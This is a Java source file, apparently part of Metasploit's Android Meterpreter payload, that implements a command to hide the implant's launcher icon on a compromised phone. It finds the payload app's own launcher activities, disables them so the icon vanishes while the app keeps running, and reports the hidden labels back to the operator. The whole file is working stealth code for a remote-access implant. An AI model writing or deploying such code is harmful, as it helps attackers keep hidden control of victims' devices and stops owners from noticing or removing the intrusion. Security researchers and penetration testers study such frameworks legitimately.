package com.metasploit.meterpreter.android;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import com.metasploit.meterpreter.AndroidMeterpreter;
import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.command.Command;

import java.util.List;

public class android_hide_app_icon implements Command {

    private static final int TLV_EXTENSIONS = 20000;
    private static final int TLV_TYPE_ICON_NAME = TLVPacket.TLV_META_TYPE_STRING | (TLV_EXTENSIONS + 9104);

    @Override
    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        final Context context = AndroidMeterpreter.getContext();
        if (context == null) {
            return ERROR_FAILURE;
        }

        String packageName = context.getPackageName();
        PackageManager packageManager = context.getPackageManager();
        final Intent intent = new Intent(Intent.ACTION_MAIN, null);
        intent.addCategory(Intent.CATEGORY_LAUNCHER);
        List<ResolveInfo> activities = packageManager.queryIntentActivities(intent, 0);
        for (ResolveInfo resolveInfo : activities) {
            if (!packageName.equals(resolveInfo.activityInfo.packageName)) {
                continue;
            }

            String activity = resolveInfo.activityInfo.name;
            String label = resolveInfo.loadLabel(packageManager).toString();
            ComponentName componentName = new ComponentName(packageName, activity);
            packageManager.setComponentEnabledSetting(componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);
            response.addOverflow(TLV_TYPE_ICON_NAME, label);
        }

        return ERROR_SUCCESS;
    }
}
